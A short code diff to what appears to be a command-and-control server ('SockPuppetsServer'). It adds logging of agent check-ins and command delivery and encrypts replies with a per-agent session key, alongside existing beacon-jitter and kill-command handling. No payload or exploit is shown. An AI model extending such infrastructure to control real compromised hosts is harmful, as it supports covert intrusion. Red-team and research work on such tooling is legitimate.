@@ -833,6 +833,8 @@ class SockPuppetsServer:
                 agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
 
             results = data.get('results') or []
+            if results:
+                logger.info(f"Checkin results from {agent_id}: {len(results)}")
             for result in results:
                 output = result.get('output', '')
                 command = result.get('command', '')
@@ -883,7 +885,10 @@ class SockPuppetsServer:
                     pass
 
             response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
-            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
+            if commands:
+                logger.info(f"Delivering {len(commands)} command(s) to {agent_id}")
+            reply_key = getattr(agent, 'session_key', None) or key_used
+            encrypted_response = self.simple_encrypt(json.dumps(response, separators=(',', ':')), reply_key)
 
             if agent.pending_kill and any(c.get('command') == '__kill' for c in commands):
                 del self.agents[agent_id]
